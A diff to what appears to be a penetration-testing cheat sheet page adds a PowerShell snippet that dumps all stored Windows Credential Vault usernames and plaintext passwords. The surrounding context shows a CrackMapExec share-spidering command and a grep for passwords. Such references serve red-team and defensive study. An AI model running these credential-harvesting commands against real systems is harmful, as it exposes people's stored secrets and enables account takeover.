@@ -629,6 +629,14 @@ you <code>grep</code> those files to find secrets.</p>
 <pre><code class="language-bash line-numbers">cme {IP} -d {DOMAIN} -u {USERNAME} -p {PASSWORD} -m spider_plus
 grep ./output_folder &quot;password&quot;
 </code></pre>
+
+<h3 id="read-vault-password">Read Vault Password</h3>
+<pre><code class="language-powershell line-numbers">[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
+(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | ForEach-Object {
+    $_.RetrievePassword()
+    Write-Host &quot;[&quot; $_.Resource &quot;] &quot; $_.Username &quot;: &quot; $_.Password
+}
+</code></pre>
             
           </div>
           <footer>
